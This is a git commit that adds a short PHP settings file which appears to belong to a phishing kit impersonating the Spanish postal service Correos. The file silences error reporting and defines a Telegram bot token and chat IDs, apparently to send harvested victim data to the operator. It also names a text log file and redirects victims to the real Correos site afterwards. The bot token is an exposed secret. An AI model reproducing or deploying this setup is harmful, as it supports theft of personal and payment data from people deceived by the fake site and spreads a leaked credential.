16e772135c62ea5c57e0c0b9aec63af46048df05
mood659 <120459071+mood659@users.noreply.github.com>
2022-12-13 11:32:06 +0100

    Y

---
+++ settings/conf.php
@@ -0,0 +1,13 @@
+<?php
+
+error_reporting(0);
+
+define("TELEGRAM_TOKEN", "5909387894:AAEfx3Mr_cUEiIK4vOrhHbnUoCXWi4p85zw");
+define("TELEGRAM_CHAT_ID", "899062656");
+define("TELEGRAM_CHAT_IDD", "-899062656");
+define("TXT_FILE_NAME", 'mjinina.txt');
+define("REDIRECT_WEBSITE", "https://www.correos.com/grupo-correos/");
+
+
+
+?>
